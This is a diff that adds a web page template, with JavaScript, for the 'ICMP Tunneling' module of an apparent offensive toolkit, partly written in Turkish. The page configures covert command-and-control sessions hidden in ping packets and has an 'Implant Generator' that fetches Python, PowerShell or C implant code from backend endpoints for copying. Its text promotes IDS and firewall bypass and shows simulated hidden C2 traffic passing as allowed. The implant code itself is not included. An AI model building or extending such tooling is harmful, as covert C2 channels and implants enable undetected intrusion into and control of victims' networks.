@@ -1,0 +1,283 @@
+{% extends "base.html" %}
+
+{% block title %}ICMP Tunneling - CyberPunk{% endblock %}
+
+{% block content %}
+<div class="space-y-6">
+    <!-- Header -->
+    <div class="flex items-center justify-between">
+        <div>
+            <h1 class="text-3xl font-bold text-white flex items-center gap-3">
+                <span class="text-4xl">📡</span>
+                ICMP Tunneling (Ping Channel)
+                <span class="px-2 py-1 bg-gradient-to-r from-cyan-500 to-blue-500 text-white text-xs font-bold rounded-full animate-pulse">PRO</span>
+            </h1>
+            <p class="text-gray-400 mt-2">Ping paketlerinin data kısmında gizli C2 trafiği - Çoğu şirket ping'i engellemez!</p>
+        </div>
+        <a href="{{ url_for('main.dashboard') }}" class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-white transition-colors">
+            ← Dashboard
+        </a>
+    </div>
+
+    <!-- Info Banner -->
+    <div class="bg-gradient-to-r from-cyan-900/50 to-blue-900/50 border border-cyan-500/30 rounded-xl p-6">
+        <div class="flex items-start gap-4">
+            <div class="text-4xl">🏓</div>
+            <div>
+                <h3 class="text-cyan-400 font-bold text-lg">Neden ICMP Tunneling?</h3>
+                <ul class="text-gray-300 mt-2 space-y-1 text-sm">
+                    <li>✓ <strong>Ping Allowed</strong> - Ağ diagnostiği için hemen her yerde açık</li>
+                    <li>✓ <strong>Payload Hidden</strong> - ICMP Echo'nun data kısmında gizli veri</li>
+                    <li>✓ <strong>No Ports</strong> - Port taramasında görünmez, sadece ICMP</li>
+                    <li>✓ <strong>IDS Bypass</strong> - "Birisi sadece ping atıyor" gibi görünür</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <!-- Configuration Panel -->
+        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+            <h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2">
+                <span>⚙️</span> Tunnel Configuration
+            </h2>
+            
+            <form id="icmpConfigForm" class="space-y-4">
+                <div>
+                    <label class="block text-gray-300 text-sm mb-2">Target IP (C2 Server)</label>
+                    <input type="text" id="targetIp" value="192.168.1.100" 
+                           class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-cyan-500 focus:outline-none">
+                </div>
+                
+                <div>
+                    <label class="block text-gray-300 text-sm mb-2">Tunnel Mode</label>
+                    <select id="tunnelMode" class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-cyan-500 focus:outline-none">
+                        {% for mode in modes %}
+                        <option value="{{ mode.name }}">{{ mode.name }} - {{ mode.value }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+                
+                <button type="submit" class="w-full py-3 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 rounded-lg text-white font-bold transition-all">
+                    🚀 Create Tunnel Session
+                </button>
+            </form>
+        </div>
+
+        <!-- Implant Generator -->
+        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+            <h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2">
+                <span>💉</span> Implant Generator
+            </h2>
+            
+            <form id="implantForm" class="space-y-4">
+                <div>
+                    <label class="block text-gray-300 text-sm mb-2">C2 Server IP</label>
+                    <input type="text" id="implantTargetIp" value="192.168.1.100"
+                           class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-cyan-500 focus:outline-none">
+                </div>
+                
+                <div>
+                    <label class="block text-gray-300 text-sm mb-2">Language</label>
+                    <select id="implantLanguage" class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-2 text-white focus:border-cyan-500 focus:outline-none">
+                        <option value="python">Python (Root required)</option>
+                        <option value="powershell">PowerShell (Admin required)</option>
+                        <option value="c">C (Compile needed)</option>
+                    </select>
+                </div>
+                
+                <button type="submit" class="w-full py-3 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 rounded-lg text-white font-bold transition-all">
+                    📦 Generate Implant
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Traffic Simulation -->
+    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+        <div class="flex justify-between items-center mb-4">
+            <h2 class="text-xl font-bold text-white flex items-center gap-2">
+                <span>📊</span> Traffic Simulation
+            </h2>
+            <button onclick="simulateTraffic()" class="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 rounded-lg text-white transition-colors">
+                🔄 Simulate Traffic
+            </button>
+        </div>
+        
+        <div id="trafficTable" class="overflow-x-auto">
+            <table class="w-full text-sm">
+                <thead>
+                    <tr class="text-gray-400 border-b border-gray-700">
+                        <th class="text-left py-2 px-3">#</th>
+                        <th class="text-left py-2 px-3">Type</th>
+                        <th class="text-left py-2 px-3">Size</th>
+                        <th class="text-left py-2 px-3">Hidden Data</th>
+                        <th class="text-left py-2 px-3">Status</th>
+                    </tr>
+                </thead>
+                <tbody id="trafficBody">
+                    <tr class="text-gray-500">
+                        <td colspan="5" class="py-4 text-center">Click "Simulate Traffic" to see example ICMP packets</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- How It Works -->
+    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+        <h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2">
+            <span>🔍</span> ICMP Packet Structure
+        </h2>
+        
+        <div class="bg-gray-900 rounded-lg p-4 font-mono text-sm">
+            <div class="text-cyan-400 mb-2">ICMP Echo Request (Type 8)</div>
+            <pre class="text-gray-300">
+┌─────────────────────────────────────────────────────────────┐
+│  Type (8)  │  Code (0)  │        Checksum                  │
+├─────────────────────────────────────────────────────────────┤
+│        Identifier        │        Sequence Number          │
+├─────────────────────────────────────────────────────────────┤
+│                    Payload Data (0-1472 bytes)             │
+│  ┌─────────────────────────────────────────────────────┐   │
+│  │ <span class="text-red-400">MAGIC</span> │ <span class="text-green-400">ENCRYPTED C2 DATA</span> │ <span class="text-yellow-400">PADDING</span>              │   │
+│  └─────────────────────────────────────────────────────┘   │
+└─────────────────────────────────────────────────────────────┘
+            </pre>
+            <div class="text-gray-500 mt-2">Normal ping: 56-64 bytes payload | C2 ping: Same size, different content</div>
+        </div>
+    </div>
+
+    <!-- Session Info -->
+    <div id="sessionInfo" class="hidden bg-gray-800 rounded-xl p-6 border border-cyan-500">
+        <h2 class="text-xl font-bold text-cyan-400 mb-4">✓ Tunnel Session Created</h2>
+        <div id="sessionDetails" class="bg-gray-900 rounded-lg p-4 font-mono text-sm text-gray-300"></div>
+    </div>
+
+    <!-- Implant Code -->
+    <div id="implantCode" class="hidden bg-gray-800 rounded-xl p-6 border border-purple-500">
+        <div class="flex justify-between items-center mb-4">
+            <h2 class="text-xl font-bold text-purple-400">💉 Generated Implant</h2>
+            <button onclick="copyImplant()" class="px-4 py-2 bg-purple-600 hover:bg-purple-500 rounded-lg text-white text-sm transition-colors">
+                📋 Copy Code
+            </button>
+        </div>
+        <div class="bg-red-900/30 rounded-lg p-3 mb-4 border border-red-500/30">
+            <p class="text-red-400 text-sm">⚠️ Raw socket kullanır - Root/Administrator yetkisi gerekir!</p>
+        </div>
+        <pre id="implantContent" class="bg-gray-900 rounded-lg p-4 overflow-x-auto text-sm text-green-400 max-h-96 overflow-y-auto"></pre>
+    </div>
+
+    <!-- IDS View -->
+    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+        <h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2">
+            <span>🛡️</span> What IDS/Firewall Sees
+        </h2>
+        
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <div class="bg-green-900/30 rounded-lg p-4 border border-green-500/30">
+                <h4 class="text-green-400 font-bold mb-2">✓ Normal Ping Traffic</h4>
+                <code class="text-gray-300 text-sm block">
+                    ICMP Echo Request → 192.168.1.100<br>
+                    64 bytes, seq=1, ttl=64<br>
+                    <span class="text-green-400">Status: ALLOWED ✓</span>
+                </code>
+            </div>
+            <div class="bg-yellow-900/30 rounded-lg p-4 border border-yellow-500/30">
+                <h4 class="text-yellow-400 font-bold mb-2">🔍 Reality (Hidden)</h4>
+                <code class="text-gray-300 text-sm block">
+                    Same ICMP Echo Request<br>
+                    Payload: [Encrypted C2 Command]<br>
+                    <span class="text-yellow-400">Undetected: Looks normal 🕵️</span>
+                </code>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+document.getElementById('icmpConfigForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const response = await fetch('/icmp-tunnel/api/create-session', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            target_ip: document.getElementById('targetIp').value,
+            mode: document.getElementById('tunnelMode').value
+        })
+    });
+    
+    const data = await response.json();
+    
+    if (data.success) {
+        document.getElementById('sessionInfo').classList.remove('hidden');
+        document.getElementById('sessionDetails').innerHTML = `
+            <p><strong>Session ID:</strong> ${data.session.session_id}</p>
+            <p><strong>Target IP:</strong> ${data.session.target_ip}</p>
+            <p><strong>ICMP Identifier:</strong> ${data.session.identifier}</p>
+            <p><strong>Mode:</strong> ${data.tunnel.mode}</p>
+            <p><strong>Max Payload:</strong> ${data.tunnel.max_payload} bytes</p>
+        `;
+    } else {
+        alert('Error: ' + data.error);
+    }
+});
+
+document.getElementById('implantForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const response = await fetch('/icmp-tunnel/api/generate-implant', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            target_ip: document.getElementById('implantTargetIp').value,
+            language: document.getElementById('implantLanguage').value,
+            mode: document.getElementById('tunnelMode').value
+        })
+    });
+    
+    const data = await response.json();
+    
+    if (data.success) {
+        document.getElementById('implantCode').classList.remove('hidden');
+        document.getElementById('implantContent').textContent = data.code;
+    } else {
+        alert('Error: ' + data.error);
+    }
+});
+
+async function simulateTraffic() {
+    const response = await fetch('/icmp-tunnel/api/simulate-traffic', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ num_packets: 10 })
+    });
+    
+    const data = await response.json();
+    
+    if (data.success) {
+        const tbody = document.getElementById('trafficBody');
+        tbody.innerHTML = data.traffic.map(pkt => `
+            <tr class="border-b border-gray-700 ${pkt.contains_data ? 'bg-red-900/20' : ''}">
+                <td class="py-2 px-3 text-gray-300">${pkt.packet_num}</td>
+                <td class="py-2 px-3 text-cyan-400">${pkt.type}</td>
+                <td class="py-2 px-3 text-gray-300">${pkt.payload_size}B</td>
+                <td class="py-2 px-3">
+                    ${pkt.contains_data ? 
+                        '<span class="text-red-400">🔴 C2 DATA</span>' : 
+                        '<span class="text-green-400">✓ Normal</span>'}
+                </td>
+                <td class="py-2 px-3 text-green-400">Allowed</td>
+            </tr>
+        `).join('');
+    }
+}
+
+function copyImplant() {
+    const code = document.getElementById('implantContent').textContent;
+    navigator.clipboard.writeText(code);
+    alert('Implant code copied to clipboard!');
+}
+</script>
+{% endblock %}
